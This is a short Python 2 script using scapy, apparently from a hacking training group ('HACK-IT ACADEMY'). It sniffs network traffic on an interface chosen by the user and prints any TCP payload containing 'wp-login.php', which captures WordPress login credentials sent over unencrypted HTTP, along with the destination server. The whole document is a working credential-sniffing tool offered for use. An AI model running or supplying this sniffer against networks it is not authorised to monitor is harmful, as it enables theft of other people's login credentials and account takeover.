from scapy.all import *
from colorama import init
init()

from colorama import Fore, Back, Style

print(Fore.RED + 'P455P04CH ::: HACK-IT ACADEMY ::: @PORTHUNTER & @0x00byte' + Fore.RESET)

interface = raw_input("Enter the interface to sniff on, e.g: 'eth0' \n") 
filter_type = raw_input("Enter your filter, e.g: 'port 80' or 'port 80 or port 8080' etc \n") 

print(Fore.GREEN + 'Sniffing packets...' + Fore.RESET)

def packet_callback(packet):

	if packet[TCP].payload:

		mail_packet = str(packet[TCP].payload)

		if "wp-login.php" in mail_packet.lower():

			print(Fore.GREEN + '[*] POTENTIALLY SENSITIVE INFORMATION FOUND' + Fore.RESET)

			print "[*] Server: %s" % packet[IP].dst
			print(Style.DIM + "[*] %s \n" % packet[TCP].payload + Style.RESET_ALL)

sniff(iface=interface,filter=filter_type,prn=packet_callback,store=0)